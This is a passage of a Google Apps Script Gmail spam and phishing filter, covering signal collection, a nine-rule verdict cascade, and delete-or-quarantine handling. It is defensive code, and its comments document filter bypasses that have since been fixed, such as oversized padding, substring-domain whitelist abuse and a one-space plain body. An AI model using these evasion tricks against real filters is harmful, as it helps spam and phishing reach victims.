      const message = messages[i];

      // Skip oversized emails (> 5MB) to prevent memory issues
      if (!shouldProcessMessage(message))
      {
        // NOT silently passed. Skipping an oversize message and then letting
        // processInbox() stamp SpamChecked was a total detector bypass for the
        // price of padding the HTML body past CONFIG.maxEmailSizeBytes: the
        // message was never evaluated by any rule and never reconsidered.
        // Flagging the thread makes an unevaluated message visible instead of
        // indistinguishable from a clean one.
        threadUnevaluated = true;
        continue;
      }

      processedCount++;
      const verdict = analyzeMessage(message);

      logDebug('Email: "' + sanitizeForLog(message.getSubject()) + '" - Spam: ' + verdict.isSpam);

      // Only mark thread as spam once, even if multiple messages trigger detection.
      // This prevents duplicate API calls and redundant log entries.
      if (verdict.isSpam && !threadMarkedAsSpam)
      {
        // Accumulate log entry BEFORE deletion — getRawContent() is unavailable after batchDelete
        // A brand-mismatched CTA is phishing, not bulk spam — log it as such
        // so phishing rows stay visually distinct in the Sheets log. Missing
        // this is the log-TYPE half of the v6.38.1 bug.
        const detectionLogType = verdict.signals &&
          (verdict.signals.serviceImpersonation || verdict.signals.brandMismatchedCta ||
           verdict.signals.callbackPhishing)
          ? 'PHISHING_DETECTED' : 'SPAM_DETECTED';
        // Capture whether the raw message actually reached Drive — the
        // destructive branch is gated on it.
        const archived = accumulateLogEntry(message, verdict.signals, detectionLogType);

        // Rule 7 (brand-mismatched CTA) quarantines rather than destroys — see
        // quarantineAsPhishing(). Every other rule deletes permanently.
        threadDestroyed = disposeDetectedMessage(message, thread, verdict.signals, archived);
        logDebug('SPAM DETECTED: ' + sanitizeForLog(message.getSubject()));

        spamCount++;
        threadMarkedAsSpam = true;
      }
    }
    catch (messageError)
    {
      logError('Error processing message: ' + messageError.toString());
      // Continue to next message — don't let one failure stop the thread
    }
  }

  return { spamCount: spamCount, processedCount: processedCount,
           destroyed: threadDestroyed, unevaluated: threadUnevaluated };
}

/**
 * Determine if a message should be processed based on size constraints.
 *
 * Emails larger than CONFIG.maxEmailSizeBytes (5MB) are skipped to prevent
 * memory issues in the Apps Script runtime. These are typically emails with
 * large attachments that are unlikely to be spam anyway.
 *
 * @param {GmailMessage} message - The message to check.
 * @return {boolean} True if message is within size limits and should be processed.
 */
function shouldProcessMessage(message)
{
  try
  {
    const body = message.getBody();
    if (body && body.length > CONFIG.maxEmailSizeBytes)
    {
      logDebug('Skipping oversized message: ' + sanitizeForLog(message.getSubject()));
      return false;
    }

    return true;
  }
  catch (error)
  {
    logError('Error checking if should process message: ' + error.toString());
    return false; // Skip on error — safer than processing a broken message
  }
}

/**
 * Build a Gmail search query to find unprocessed inbox emails.
 *
 * Constructs a query that finds emails:
 *   - In the inbox OR any category tab (spam can hide in Updates, Promotions, etc.)
 *   - Without the "SpamChecked" label (not yet processed)
 *   - Received after the lookback window (CONFIG.daysToCheck)
 *
 * @return {string} Gmail search query string.
 */
function buildSearchQuery()
{
  // Calculate the lookback date (N days ago)
  const date = new Date();
  date.setDate(date.getDate() - CONFIG.daysToCheck);
  const dateStr = Utilities.formatDate(date, Session.getScriptTimeZone(), 'yyyy/MM/dd');

  // Combine: all inbox tabs + not-yet-processed + recent
  // Gmail's {} is OR — catches spam hiding in any category tab
  // Excluding the phishing label as well as the processed label makes
  // quarantine idempotent: a quarantined thread that is still in the inbox
  // (a reply-chain lure leaves a sibling message there, or the user
  // un-archives it to look) will not be re-detected every minute.
  return '{in:inbox category:updates category:promotions category:social category:forums}' +
         ' -label:' + CONFIG.processedLabel +
         ' -label:' + CONFIG.phishingLabel + ' after:' + dateStr;
}


// =============================================================================
// Bulk Email Detection
// =============================================================================

/**
 * Return true if the raw email content contains any bulk email service fingerprint.
 *
 * Lowercases internally so callers don't need to pre-process.
 *
 * @param {string} rawContent - Full raw RFC 822 message content.
 * @return {boolean} True if a bulk service fingerprint is found.
 */
function isBulkEmail(rawContent)
{
  // Scan only the head of the message. Every fingerprint lives in a header, and
  // rawContent can be 25MB when a large attachment is present — lowercasing all
  // of it allocated a second full copy for no detection benefit.
  const lower = String(rawContent || '')
    .substring(0, LIMITS.maxRawScanChars)
    .toLowerCase();
  return BULK_EMAIL_FINGERPRINTS.some(function(fingerprint) {
    return lower.includes(fingerprint);
  });
}


// =============================================================================
// Spam Detection Engine
// =============================================================================

/**
 * Collect all spam signals from a message.
 *
 * Design principle — separation of concerns:
 *   collectSignals() answers "what's in this email?" (facts)
 *   makeVerdict()    answers "is this spam?"           (judgement)
 * Keeping them separate makes each function easier to test and debug.
 * If an email is incorrectly flagged, you can inspect the signals object
 * to see exactly which patterns fired, without needing to trace through
 * the rule logic at the same time.
 *
 * Extracts and normalizes email fields, checks the whitelist, then populates
 * a signals object from independent detection categories. Each signal is
 * evaluated without reference to the others — verdict logic lives in
 * makeVerdict().
 *
 * @param {GmailMessage} message - The Gmail message to analyze.
 * @return {Object|null} Signals object with boolean/numeric fields,
 *                       or null if sender is whitelisted (skip detection).
 */
function collectSignals(message)
{
  // ── Whitelist check first — before any expensive field fetch ────────────
  // getFrom() is cheap (metadata from cached search results). getRawContent()
  // is an expensive separate HTTP download of the full RFC 822 message.
  // Checking the whitelist immediately means whitelisted senders (LinkedIn,
  // Substack, Meetup, etc. — DEFAULT_DOMAINS.legitimate is the real list;
  // GitHub/Stripe/banks are NOT in it) never trigger a raw message download.
  // IMPORTANT: match against the extracted email address only, not the full
  // From string — prevents display-name spoofing such as:
  //   "LinkedIn News <spammer@spam.com>" bypassing the whitelist check.
  // Extract the address from the UNTRUNCATED From, then truncate only what
  // feeds pattern matching.
  //
  // Truncating first cut the address off any header with a display name longer
  // than maxFromChars, so the whitelist check silently missed. Same story as
  // the comment form above: tolerable when the outcome was "stays in Spam",
  // unacceptable once a failed whitelist match can mean deletion. The
  // truncation exists to bound quadratic regex cost on attacker-controlled
  // text, which the address extraction does not participate in.
  const fromRaw = sanitizeInput(message.getFrom());
  const senderAddress = extractEmailAddress(
    fromRaw.replace(RFC2822_QUOTED_NAME, '$1$2'));
  const from = fromRaw
    .substring(0, LIMITS.maxFromChars)
    .replace(RFC2822_QUOTED_NAME, '$1$2');

  const whitelist = getCachedWhitelist();
  for (let i = 0; i < whitelist.length; i++)
  {
    // addressMatchesDomain(), NOT includes(). Substring matching here was a
    // complete detection bypass: "mail@linkedin.com.secure-login.top" contains
    // "linkedin.com" and so returned null before any signal was collected, as
    // did "a@notlinkedin.com". Anyone who registered a domain containing a
    // whitelisted string got a blanket exemption.
    if (addressMatchesDomain(senderAddress, whitelist[i]))
    {
      logDebug('Whitelisted domain detected: ' + whitelist[i]);
      return null; // null = whitelisted, skip all detection
    }
  }

  // ── Extract remaining fields (only reached for non-whitelisted senders) ─
  // Truncated hard for pattern matching — see LIMITS.maxSubjectChars for the
  // quadratic-regex measurements that motivate it.
  const subject = sanitizeInput(message.getSubject()).substring(0, LIMITS.maxSubjectChars);
  // Fall back to HTML-stripped body if plain body is empty (HTML-only emails).
  // Without this fallback, BODY_CRYPTO_PATTERNS would silently never fire on
  // messages that have no text/plain part.
  const plainBody = message.getPlainBody();

  // getBody() returns the decoded, charset-normalized HTML. It is NOT an extra
  // API round trip: shouldProcessMessage() already calls it on every message
  // for the size check, so the GmailMessage has it cached. Only
  // getRawContent() costs a separate fetch (format=raw vs format=full).
  const rawHtml = message.getBody();
  const html = sanitizeInput(rawHtml);

  // Truncate BEFORE stripping, not after. Previously sanitizeInput() wrapped
  // the *result* of stripHtmlTags(), so the two regex passes ran across up to
  // 5 MB (the shouldProcessMessage ceiling) and allocated two 5 MB
  // intermediates on every HTML-only message.
  // .trim() matters: a text/plain part containing a single space is truthy,
  // so the HTML fallback never ran and Signals 2b/2c/2d all saw an empty
  // body. One space in the plain part disabled every body-based signal.
  const body = sanitizeInput(plainBody).trim() || stripHtmlTags(html);
  const rawContent = message.getRawContent(); // Full RFC 822 content (includes all headers)

  // ── Initialize signal accumulators ───────────────────────────────────────
  // Each detection phase below populates one signal. makeVerdict() combines
  // them to produce the spam/not-spam decision.
  const signals = {
    bulkEmailService: false,          // Sent via Amazon SES, SendGrid, or Mailchimp
    blacklistedSender: false,         // From a known spam mill domain
    clickbaitCount: 0,                // Number of clickbait patterns matched
    fearMongering: false,             // Contains fear-mongering language
    marketingFormat: false,           // From field uses marketing formatting
    suspiciousFromName: false,        // Display name is headline-like
    emptySubjectWithAttachment: false, // Empty subject + has attachment (payload scam)
    serviceImpersonation: false,       // Cloud service subject from non-service sender (phishing)
    brandMismatchedCta: false,         // CTA names a document brand, links elsewhere (phishing)
    freeMailRandomLocal: false,        // free-mail sender with a machine-generated local part
    callbackPhishing: false            // fake brand invoice from free mail, payload is a phone number
  };

  // ── Signal 1a: Bulk email service detection ─────────────────────────────
  // Check raw email headers for bulk service fingerprints (see BULK_EMAIL_FINGERPRINTS).
  // Bulk email services (Amazon SES, SendGrid, Mailchimp) are used by both legitimate senders
  // like LinkedIn AND spam mills, so this signal alone is not enough to call
  // something spam. But it "multiplies" other signals: if you're using bulk
  // infrastructure AND have clickbait subjects, that combination is very suspicious.
  // Rules 1-3 all require bulk email as a prerequisite for exactly this reason.
  if (isBulkEmail(rawContent))
  {
    signals.bulkEmailService = true;
    logDebug('Bulk email service detected');
  }

  // ── Signal 1b: Blacklisted sender domain ────────────────────────────────
  // Substring match against known spam mill domains from Script Properties.
  // One match is enough — these domains have no legitimate use.
  // Match against the extracted email address only (not the display name) for
  // the same reason as the whitelist check above — prevents spoofing both ways.
  const blacklist = getCachedBlacklist();
  for (let i = 0; i < blacklist.length; i++)
  {
    // Strict domain matching, same reasoning as the whitelist above.
    if (addressMatchesDomain(senderAddress, blacklist[i]))
    {
      signals.blacklistedSender = true;
      logDebug('Blacklisted sender detected: ' + blacklist[i]);
      break;
    }
  }

  // ── Signal 1c: Suspicious From display name ─────────────────────────────
  // Strip the <email@address> portion, then check the remaining display name.
  // Legitimate senders use plain names ("John Smith"); spam mills stuff
  // headlines into display names ("Breaking • Banks Closing • Alert").
  const fromDisplayName = from.replace(/<[^>]*>$/, '').trim(); // quotes already stripped above
  if (fromDisplayName.includes('•') ||     // Bullet separator — never used by legitimate senders
      fromDisplayName.length > LIMITS.maxDisplayNameLength) // Excessive length — keyword stuffing
  {
    signals.suspiciousFromName = true;
    logDebug('Suspicious From name detected: ' + sanitizeForLog(fromDisplayName));
  }

  // Subject echo removed: caused false positives on legitimate company emails
  // (e.g. "Your Converse Canada order" + From "Converse Canada") — a company
  // using its own name in both fields is normal, not suspicious. All spam
  // previously caught by this signal was already caught by Rule 1 (blacklist).

  // ── Signal 2: Clickbait / sensationalism patterns ───────────────────────
  // Each pattern targets a CATEGORY of spam tactic, not specific phrases.
  // Patterns are checked against both subject AND from field concatenated,
  // since spammers stuff clickbait into display names too.
  // Each matching pattern increments clickbaitCount independently.
  const textToCheck = subject + ' ' + from;
  for (let i = 0; i < CLICKBAIT_PATTERNS.length; i++)
  {
    if (CLICKBAIT_PATTERNS[i].test(textToCheck))
    {
      signals.clickbaitCount++;
    }
  }

  // ── Signal 2b: Body crypto scam patterns ────────────────────────────────
  // High-confidence terms that almost never appear in legitimate email bodies.
  // Checked against body only — subject/from rarely contain these phrases.
  // Each match increments clickbaitCount independently (supports Rule 4).
  for (let i = 0; i < BODY_CRYPTO_PATTERNS.length; i++)
  {
    if (BODY_CRYPTO_PATTERNS[i].test(body))
    {
      signals.clickbaitCount++;
    }
  }

  // ── Signal 2c: Body fear patterns ───────────────────────────────────────
  // Phishing-specific fear phrases like "your access could be compromised".
  // FEAR_PATTERNS only check subject+from, missing scams that keep the subject
  // bland (e.g. "System Configuration Notice") and put fear in the body.
  // Each match increments clickbaitCount (same as BODY_CRYPTO_PATTERNS).
  for (let i = 0; i < BODY_FEAR_PATTERNS.length; i++)
  {
    if (BODY_FEAR_PATTERNS[i].test(body))
    {
      signals.clickbaitCount++;
    }
  }

  // ── Signal 2d: Unicode obfuscation in body ──────────────────────────────
  // Spammers hide obfuscated "click here" text inside HTML while keeping the
  // subject clean (e.g. body anchor contains "Сⅼіϲkhеrе" in Cyrillic).
  // Subject+from already checked in Signal 2 — this catches body-only evasion.
  // Break after first match: all four patterns detect the same technique, so
  // counting them independently would over-inflate clickbaitCount.
  for (let i = 0; i < BODY_UNICODE_PATTERNS.length; i++)
  {
    if (BODY_UNICODE_PATTERNS[i].test(body))
    {
      signals.clickbaitCount++;
      break;
    }
  }

  // ── Signal 3: Fear-mongering detection ──────────────────────────────────
  // Boolean signal — we only need to know if fear is present, not how many
  // patterns match. First match short-circuits the loop.
  for (let i = 0; i < FEAR_PATTERNS.length; i++)
  {
    if (FEAR_PATTERNS[i].test(textToCheck))
    {
      signals.fearMongering = true;
      logDebug('Fear-mongering detected (pattern match)');
      break; // Boolean signal — one match is enough
    }
  }

  // ── Signal 4: Marketing sender format ───────────────────────────────────
  // Checked against From field only (not subject). Detects spammy sender
  // name formatting like "Name | Org", spammy business names, and suspicious
  // email address patterns. Commas deliberately excluded — common in legit
  // org/place names. Bare pipe check removed — subsumed by /\|\s*[A-Z]/.
  for (let i = 0; i < MARKETING_PATTERNS.length; i++)
  {
    if (MARKETING_PATTERNS[i].test(from))
    {
      signals.marketingFormat = true;
      logDebug('Marketing sender format detected');
      break; // Boolean signal — one match is enough
    }
  }

  // ── Signal 5: Empty subject + attachment ────────────────────────────────
  // Payload delivery scams hide their content inside attached files (Excel,
  // PDF) and leave the subject and body empty to evade text-pattern rules.
  // Legitimate email virtually never combines an empty subject with an
  // attachment — this pair alone is sufficient to classify as spam.
  try
  {
    if (subject.trim() === '' && message.getAttachments().length > 0)
    {
      signals.emptySubjectWithAttachment = true;
      logDebug('Empty subject with attachment detected');
    }
  }
  catch (attachError)
  {
    // Non-fatal: skip this signal if attachment check fails (e.g., malformed message)
    logError('Could not check attachments — signal skipped: ' + attachError.toString());
  }

  // ── Signal 6: Service impersonation phishing ────────────────────────────
  // Cloud document-sharing notifications (Google Docs, OneDrive, Dropbox) are
  // ONLY ever sent by the actual service's own mail servers. A "Document shared
  // with you" email from ywammaui.org is 100% phishing — a compromised
  // legitimate account used as a delivery vector.
  const matchesServiceSubject = IMPERSONATION_SUBJECT_PATTERNS.some(function(p) {
    return p.test(subject);
  });
  if (matchesServiceSubject)
  {
    const senderLower = senderAddress.toLowerCase();
    const fromTrustedService = CLOUD_SERVICE_DOMAINS.some(function(d) {
      return senderLower.endsWith('@' + d) || senderLower.endsWith('.' + d);
    });
    if (!fromTrustedService)
    {
      signals.serviceImpersonation = true;
      logDebug('Service impersonation: cloud service subject from untrusted sender ' + sanitizeForLog(senderAddress));
    }
  }

  // ── Signal 8: Free-mail sender with a machine-generated local part ──────
  // Deliberately NOT part of any inbox rule on its own — plenty of real people
  // have digits in their address, and a false positive here would delete mail
  // from a person. It exists to CORROBORATE an existing spam verdict: in the
  // Spam folder, where Gmail has already judged the message, one independent
  // signal is enough. See reviewGmailSpam().
  const atIdx = senderAddress.lastIndexOf('@');
  // Hoisted: Signal 9 needs the same determination, and computing it twice
  // would let the two signals disagree after an edit to one of them.
  let isFreeMail = false;
  if (atIdx > 0)
  {
    const localPart   = senderAddress.substring(0, atIdx);
    const senderHost  = senderAddress.substring(atIdx + 1);
    isFreeMail        = FREE_MAIL_DOMAINS.some(function(d) {
      return hostMatchesDomain(senderHost, d);
    });

    if (isFreeMail && RANDOM_LOCAL_PART_PATTERNS.some(function(p) {
      return p.test(localPart);
    }))
    {
      signals.freeMailRandomLocal = true;
      logDebug('Free-mail sender with machine-generated local part: ' +
               sanitizeForLog(senderAddress));
    }
  }

  // ── Signal 9: Callback phishing (the payload is a phone number) ─────────
  //
  // Closes the class that got raju47326yu@gmail.com past every other signal.
  // That message was a fake Norton renewal notice: From display name set to the
  // recipient's own name, sender a throwaway gmail.com address, body a plausible
  // invoice ($145.91, a product key, a payment ID) and a support number to call.
  //
  // Nothing else could see it. It carried NO links at all, so Signal 7 had
  // nothing to compare; it was direct-send, so Rules 1-3 had no bulk
  // prerequisite; its subject is a flat statement, so no clickbait or fear
  // pattern fired. Only Signal 8 touched it, and Signal 8 deliberately cannot
  // convict alone. The scam works precisely BECAUSE it has no link to inspect —
  // the victim is moved to a phone call, where no email filter follows.
  //
  // So detect the anatomy rather than the wording. All four must hold:
  //   1. free-mail sender          — a real brand never bills from gmail.com
  //   2. names an impersonated brand — claims to be someone it provably isn't
  //   3. billing language           — asserts money is moving
  //   4. a phone number             — the actual payload
  //
  // A four-way conjunction because no single part is rare. Real people do send
  // invoices from Gmail, and real invoices carry phone numbers; it is the
  // combination with an impersonated brand that has no innocent reading.
  //
  // Quarantines rather than deletes (Rule 9 is absent from DESTRUCTIVE_RULES).
  // The residual false-positive class is a person forwarding a genuine Norton
  // receipt and adding a callback number, which is unlikely but not absurd —
  // and per the project's standing rule, a fuzzy signal gets a recoverable
  // disposition. In the Spam folder it still deletes, because it counts toward
  // hasCorroboratingSignal() where Gmail has already judged the message.
  if (isFreeMail)
  {
    const scanText = (subject + ' ' + body)
      .substring(0, LIMITS.maxRawScanChars)
      .toLowerCase();

    const impersonated = IMPERSONATED_SUPPORT_BRANDS.filter(function(b) {
      return scanText.indexOf(b) !== -1;
    });

    if (impersonated.length > 0 &&
        CALLBACK_PHONE_PATTERN.test(scanText) &&
        BILLING_LANGUAGE_PATTERNS.some(function(p) { return p.test(scanText); }))
    {
      signals.callbackPhishing = true;
      logDebug('Callback phishing: free-mail sender invoicing as "' +
               impersonated[0] + '" with a phone number');
    }
  }

  // ── Signal 7: Brand-mismatched call-to-action ───────────────────────────
  // A button reading "VIEW IN DOCUSIGN" whose href is not DocuSign borrows
  // trust the sender has not earned. This is the only signal that inspects the
  // LINK GRAPH rather than sender-side vocabulary, which is why it reaches a
  // class of phishing that carries no clickbait, no urgency, no Unicode
  // obfuscation and a valid DKIM signature for its own domain.
  //
  // Wrapped in its own try/catch, exactly as Signal 5 is. analyzeMessage()'s
  // catch-all returns {isSpam:false, signals:null}, so an uncaught throw from
  // the anchor scan would discard EVERY other signal on the message and
  // silently mark it not-spam. Degrade one signal, never the whole verdict.
  try
  {
    // rawHtml, not the sanitizeInput()-truncated `html`. sanitizeInput caps at
    // LIMITS.maxInputChars (100 000), which made LIMITS.maxHtmlScanChars
    // (262 144) unreachable dead config AND hid any CTA past 100KB - real
    // marketing HTML with inlined CSS and base64 images routinely exceeds it.
    // extractAnchors() is independently bounded, which is precisely why it is
    // safe to hand it the untruncated body. Measured worst case ~9ms.
    if (hasBrandMismatchedCta(rawHtml, senderAddress))
    {
      signals.brandMismatchedCta = true;
    }
  }
  catch (ctaError)
  {
    logError('Brand-CTA scan failed — signal skipped: ' + ctaError.toString());
  }

  return signals;
}

/**
 * Apply the 7-rule decision cascade to a collected signals object.
 *
 * Rules are evaluated in priority order. The first rule that fires wins —
 * later rules are not evaluated. Returns immediately on the first match.
 *
 * @param {Object} signals - Signal object returned by collectSignals().
 * @return {boolean} true if the email is spam, false if it is not.
 */
function makeVerdict(signals)
{
  // Rule 1: Bulk email + blacklisted sender = definitive spam
  // Rationale: Known spam domain + bulk infrastructure = zero false positive risk
  if (signals.bulkEmailService && signals.blacklistedSender)
  {
    logInfo('SPAM DETECTED: Bulk email + blacklisted sender');
    return true;
  }

  // Rule 2: Bulk email + 2+ clickbait patterns = spam
  // Rationale: Legitimate bulk senders rarely use multiple clickbait tactics
  if (signals.bulkEmailService && signals.clickbaitCount >= 2)
  {
    logInfo('SPAM DETECTED: Bulk email + clickbait (' + signals.clickbaitCount + ' patterns)');
    return true;
  }

  // Rule 3: Bulk email + 2+ distinct spam behaviors = spam
  // "Distinct behaviors" are: any clickbait, fear-mongering, marketing format,
  // or suspicious From name — four INDEPENDENT signals that each detect a
  // different aspect of spam. Finding 2+ of them is strong evidence because
  // it's very unlikely that two unrelated spam indicators both fire on a
  // legitimate email by coincidence.
  let spamBehaviorCount = 0;
  if (signals.clickbaitCount >= 1) spamBehaviorCount++;
  if (signals.fearMongering) spamBehaviorCount++;
  if (signals.marketingFormat) spamBehaviorCount++;
  if (signals.suspiciousFromName) spamBehaviorCount++;

  if (signals.bulkEmailService && spamBehaviorCount >= 2)
  {
    logInfo('SPAM DETECTED: Bulk email + ' + spamBehaviorCount + ' spam behaviors');
    return true;
  }

  // Rule 4: Extreme clickbait alone (no bulk email required)
  // Rationale: 3+ clickbait hits is so anomalous that even non-bulk senders
  // are almost certainly spam (catches direct-send spam)
  if (signals.clickbaitCount >= 3)
  {
    logInfo('SPAM DETECTED: Extreme clickbait (' + signals.clickbaitCount + ' patterns)');
    return true;
  }

  // Rule 5: Empty subject + attachment = payload delivery scam
  // Rationale: Legitimate email virtually never has both an empty subject
  // and an attachment. This pattern is the fingerprint of file-based scams
  // that hide phishing links or malware inside Excel/PDF attachments to
  // bypass text-pattern detection entirely.
  if (signals.emptySubjectWithAttachment)
  {
    logInfo('SPAM DETECTED: Empty subject with attachment (payload delivery scam)');
    return true;
  }

  // Rule 6: Service impersonation phishing (no bulk email required)
  // Rationale: Phishing campaigns impersonating Google Docs/Drive, OneDrive, or
  // Dropbox are delivered via compromised legitimate accounts — not bulk
  // infrastructure. The subject template alone is definitive: a real cloud
  // service ALWAYS sends notifications from its own domain.
  if (signals.serviceImpersonation)
  {
    logInfo('SPAM DETECTED: Service impersonation phishing (cloud service subject from non-service sender)');
    return true;
  }

  // Rule 7: Brand-mismatched CTA phishing (no bulk email required)
  // Rationale: a call-to-action naming DocuSign/Adobe Sign/SharePoint that
  // resolves to a host the brand does not control has no legitimate form. The
  // signal already abstains on click-trackers, link-wrappers and
  // sender-aligned hosts, so what reaches here is an unexplained brand
  // mismatch. Deliberately NOT gated on bulk email: this class also arrives
  // via compromised legitimate accounts, the same reasoning Rule 6 accepted.
  if (signals.brandMismatchedCta)
  {
    logInfo('SPAM DETECTED: Brand-mismatched CTA phishing (link text names a document brand the destination does not control)');
    return true;
  }

  // Rule 8: Free-mail machine-generated sender + 2+ spam behaviors (no bulk)
  // Rationale: Rules 1-3 all require bulk infrastructure, so a direct-send
  // 419/advance-fee scam from a throwaway free-mail account slipped through
  // entirely — it is not bulk-routed, and gmail.com cannot be blacklisted
  // without distrusting every real person who uses it.
  //
  // freeMailRandomLocal is the gate, and it is a narrow one: a consumer
  // free-mail domain AND a local part no human would choose. It fires on 0 of
  // the 22 ham examples and cannot fire at all for a sender on their own
  // domain. Requiring two further independent behaviours on top means a real
  // person would need a machine-shaped address AND two clickbait/fear hits.
  if (signals.freeMailRandomLocal && spamBehaviorCount >= 2)
  {
    logInfo('SPAM DETECTED: Free-mail machine-generated sender + ' +
            spamBehaviorCount + ' spam behaviors');
    return true;
  }

  // Rule 9: Callback phishing — fake brand invoice from free mail with a
  // phone-number payload. No bulk prerequisite and no link required, which is
  // the whole point: this class carries neither. See Signal 9 for why all four
  // of its conditions are required together.
  if (signals.callbackPhishing)
  {
    logInfo('PHISHING DETECTED: Callback scam (free-mail sender invoicing as a ' +
            'brand it is not, with a phone number to call)');
    return true;
  }

  // No rule triggered — email is not spam
  logDebug('Not spam - signals: bulk=' + signals.bulkEmailService +
           ', blacklist=' + signals.blacklistedSender +
           ', clickbait=' + signals.clickbaitCount +
           ', fear=' + signals.fearMongering +
           ', marketing=' + signals.marketingFormat +
           ', suspiciousFrom=' + signals.suspiciousFromName +
           ', emptySubjectAttachment=' + signals.emptySubjectWithAttachment +
           ', serviceImpersonation=' + signals.serviceImpersonation +
           ', brandMismatchedCta=' + signals.brandMismatchedCta +
           ', freeMailRandomLocal=' + signals.freeMailRandomLocal +
           ', callbackPhishing=' + signals.callbackPhishing);
  return false;
}

/**
 * Analyze a message and return whether it is spam.
 *
 * Thin orchestrator: delegates signal collection to collectSignals() and
 * verdict logic to makeVerdict(). Whitelisted senders short-circuit to
 * false before any signal collection occurs.
 *
 * @param {GmailMessage} message - The Gmail message to analyze.
 * @return {Object} {isSpam: boolean, signals: Object|null}. `signals` is null
 *                  when the sender is whitelisted or signal collection threw.
 */
function analyzeMessage(message)
{
  try
  {
    const signals = collectSignals(message);
    if (signals === null) return { isSpam: false, signals: null }; // whitelisted
    const isSpam = makeVerdict(signals);
    return { isSpam: isSpam, signals: signals };
  }
  catch (error)
  {
    logError('Error analyzing message: ' + error.toString());
    return { isSpam: false, signals: null }; // Default to not-spam on error
  }
}


// =============================================================================
// Spam Action — Report and Delete
// =============================================================================

/**
 * Mark a message as spam, report it to Gmail, and permanently delete it.
 *
 * Two-step process:
 *   1. modify() — adds SPAM label, removes INBOX label (trains Gmail's filters)
 *   2. batchDelete() — permanently deletes by known message ID (no query needed)
 *
 * Falls back to GmailApp.moveToSpam() if the Advanced Gmail Service is
 * unavailable (e.g., not enabled in the project). Has a second fallback
 * layer if the primary API call fails entirely.
 *
 * Note: batchDelete() is used even for single messages because the Advanced
 * Gmail Service does NOT expose a single-message delete() method.
 *
 * @param {GmailMessage} message - The spam message to report and delete.
 * @param {GmailThread} thread  - The thread containing the message (for fallback).
 */
/**
 * Dispose of a message that has been judged spam, choosing destroy vs
 * quarantine based on which rule fired.
 *
 * Single point of routing so the two automatic detection paths — processThread()
 * and recheckRecentSpamChecked() — cannot drift apart. Rule identity comes from
 * getRuleFromSignals(), which mirrors makeVerdict()'s cascade, so this stays in
 * step with the verdict logic by construction.
 *
 * NOT used by checkFalseNegatives(): that path runs when the user has manually
 * applied the "SpamMissed" label, which is an explicit human instruction to
 * destroy the message. Overriding it with a quarantine would ignore the user.
 *
 * @param {GmailMessage} message - The message to dispose of.
 * @param {GmailThread}  thread  - Its thread.
 * @param {Object|null}  signals - Signal object from collectSignals().
 * @param {boolean} archived - Whether archiveRawEml() stored the raw message.
 *                  A destructive rule with archived !== true is downgraded to a
 *                  quarantine: deleting the only copy of a message we could not
 *                  back up is never the right answer.
 * @return {boolean} true if the thread was destroyed and must not be touched again.
 */
function disposeDetectedMessage(message, thread, signals, archived)
{
  const rule = getRuleFromSignals(signals).rule;

  // Allowlist the destructive branch instead of defaulting to it.
  //
  // Previously this deleted for anything that was not exactly 'Rule 7', so an
  // unidentifiable verdict — getRuleFromSignals() returns 'NONE' for null
  // signals — chose PERMANENT DELETION. For an irreversible action the default
  // for an unknown disposition must be the recoverable branch. Unreachable
  // today (both callers gate on verdict.isSpam), which is exactly when this
  // kind of default goes unnoticed until it isn't.
  const DESTRUCTIVE_RULES = ['Rule 1', 'Rule 2', 'Rule 3', 'Rule 4', 'Rule 5',
                             'Rule 6', 'Rule 8'];

  if (DESTRUCTIVE_RULES.indexOf(rule) !== -1)
  {
    // The archive invariant, ENFORCED rather than documented.
    //
    // Four comments in this file used to assert "archived before deleting" and
    // none of them were true: accumulateLogEntry() buffered, and the Drive
    // write happened after the thread loop, so the real order was delete-then-
    // archive. Any interruption in between lost the only copy. archiveRawEml()
    // now writes synchronously and reports success, and this is the gate that
    // makes it matter: a message with no archive is never permanently deleted.
    if (archived !== true)
    {
      logError('REFUSING to permanently delete (no Drive archive): ' +
               sanitizeForLog(message.getSubject()) + ' — quarantining instead. ' +
               'Run setupLogging() if this persists.');
      quarantineUnarchived(message, thread);
      return false;
    }

    markAsSpam(message, thread);
    return true;  // thread destroyed — caller must not touch it again
  }

  // Rules that quarantine BY DESIGN. Anything reaching the non-destructive
  // branch from outside this list is an unidentified verdict, which is worth
  // an error even though the disposition is the safe one.
  const QUARANTINE_RULES = ['Rule 7', 'Rule 9'];

  if (QUARANTINE_RULES.indexOf(rule) === -1)
  {
    logError('Unidentified rule "' + rule + '" for a message judged spam — ' +
             'quarantining rather than deleting');
  }

  quarantineAsPhishing(message, thread);
  return false;   // thread still exists
}

/**
 * Hold a message for human review: archive it out of the inbox, label it, and
 * never delete it.
 *
 * Used for RETROACTIVE re-judgements — mail the user has already seen and
 * chosen to keep, which a newly deployed pattern now scores as spam. That is a
 * materially different situation from a first-pass verdict on mail that just
 * arrived:
 *
 *   - The user already exercised judgement on it and kept it.
 *   - The pattern that now condemns it was deployed minutes ago and its
 *     false-positive behaviour is evidenced only by a 22-file ham corpus.
 *   - recheckRecentSpamChecked() is forced to run within a minute of every
 *     deploy, so a bad pattern reaches this path faster than anywhere else.
 *
 * The same reasoning that gave Rule 7 a quarantine applies with more force
 * here: on the day a pattern changes, EVERY rule has an unproven
 * false-positive class. So this path stopped permanently deleting in v6.48.0.
 *
 * The message leaves the inbox, so the user's inbox still gets cleaned and the
 * recheck query (which is scoped to in:inbox) will not see it again.
 *
 * @param {GmailMessage} message
 * @param {GmailThread}  thread
 * @param {string}       reason - Logged, for telling these apart later.
 * @return {boolean} true if the message was archived and labelled.
 */
function holdForReview(message, thread, reason)
{
  const subject = sanitizeForLog(message.getSubject());
  let labelled = false;

  try
  {
    const review = getOrCreateLabel(CONFIG.reviewLabel);
    if (review) { thread.addLabel(review); labelled = true; }
    const processed = getOrCreateLabel(CONFIG.processedLabel);
    if (processed) thread.addLabel(processed);
  }
  catch (labelError)
  {
    logError('Could not label held message: ' + labelError.toString());
  }

  try
  {
    if (typeof Gmail !== 'undefined' && Gmail.Users && Gmail.Users.Messages)
    {
      // Archive only — no SPAM label, so destroySpam() can never reach it.
      Gmail.Users.Messages.modify({ removeLabelIds: ['INBOX'] }, 'me', message.getId());
    }
    else
    {
      thread.moveToArchive();
    }

    logInfo('HELD FOR REVIEW (' + reason + '): ' + subject);
    return true;
  }
  catch (error)
  {
    logError('Could not archive held message: ' + error.toString());
    return labelled;
  }
}

/**
 * Hold a message that a destructive rule matched but which could not be
 * archived.
 *
 * Deliberately does NOT use the Phishing label — the rule that fired was a
 * spam rule, not Rule 7, and mislabelling it would corrupt both the user's
 * mental model and the training log. Leaves the message in place, flagged for
 * review, so the next run can retry once the archive is reachable again.
 *
 * @param {GmailMessage} message
 * @param {GmailThread}  thread
 */
